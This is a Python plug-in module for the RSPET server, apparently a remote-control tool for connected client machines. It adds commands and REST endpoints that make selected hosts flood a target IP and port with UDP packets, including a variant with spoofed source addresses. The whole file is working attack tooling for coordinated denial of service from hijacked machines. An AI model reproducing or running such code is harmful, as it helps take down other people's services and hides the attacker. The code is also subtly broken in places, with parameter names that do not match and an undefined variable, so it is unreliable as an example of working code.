"""
Plug-in module for RSPET server. Offer functions related to udp flooding.
"""
from aiohttp import web
from socket import error as sock_error
from rspet.server.decorators import command, installer, route, router


@command("connected", "multiple")
def udp_flood(server, args):
    """Flood target machine with UDP packets.

    Help: <target_ip> <target_port> [payload]"""

    ret = [None, 0, ""]
    hosts = server.get_selected()
    if len(args) < 2:
        ret[2] = ("Syntax : %s" % server.commands["udp_flood"].__syntax__)
        ret[1] = 1  # Invalid Syntax Error Code
    else:
        try:
            # IP:port:payload
            cmd = "%s:%s:%s" % (args[0], args[1], args[2])
        except IndexError:
            cmd = "%s:%s:Hi" % (args[0], args[1])
        for host in hosts:
            try:
                host.send(host.command_dict['udpFlood'])
                host.send(cmd)
            except sock_error:
                host.purge()
                ret[0] = "basic"
                ret[1] = 2  # Socket Error Code
    return ret


@command("connected", "multiple")
def udp_spoof(server, args):
    """Flood target machine with UDP packets via spoofed ip & port.

    Help: <target_ip> <target_port> <spoofed_ip> <spoofed_port> [payload]"""

    ret = [None, 0, ""]
    hosts = server.get_selected()
    if len(args) < 4:
        ret[2] = ("Syntax : %s" % server.commands["udp_spoof"].__syntax__)
        ret[1] = 1  # Invalid Syntax Error Code
    else:
        try:
            # IP:port:new_ip:new_port:payload
            cmd = "%s:%s:%s:%s:%s" % (args[0], args[1], args[2], args[3], args[4])
        except IndexError:
            cmd = "%s:%s:%s:%s:Hi" % (args[0], args[1], args[2], args[3])
        for host in hosts:
            try:
                host.send(host.command_dict['udpSpoof'])
                host.send(cmd)
            except sock_error:
                host.purge()
                ret[0] = "basic"
                ret[1] = 2  # Socket Error Code
    return ret


# REST API VEIWS

async def udp_helper(requests, rtype='flood'):
    try:
        body = await request.json()
        target = body['target']
        args = [target['ip'], target['port']]
        if rtype == 'spoof':
            spoof = body['spoof']
            args.extend([spoof['ip'], spoof['port']])
        try:
            args.append(body['payload'])
        except KeyError:
            pass
        clients = body['clients']
    except:
        pass  # Return an error ...
    server = request.app['server']
    res = server.select(clients)
    if res[0] != 0:
        server.select([])
        return web.json_response(
            {'error': 'Host %s not found' % hid},
            status=404
        )
    if rtype == 'spoof':
        udp_spoof(server, args)
    else:
        udp_flood(server, args)
    return web.Response(status=204)


@route('POST', 'flood/', 'udp_flood')
async def api_udp_flood(requests):
    return (await udp_helper(request))


@route('POST', 'spoof/', 'udp_spoof')
async def api_udp_spoof(requests):
    return (await udp_helper(request, 'spoof'))


@installer(__name__)
def setup(app, commands):
    pass


@router(__name__)
def make_routes(app, name):
    pass
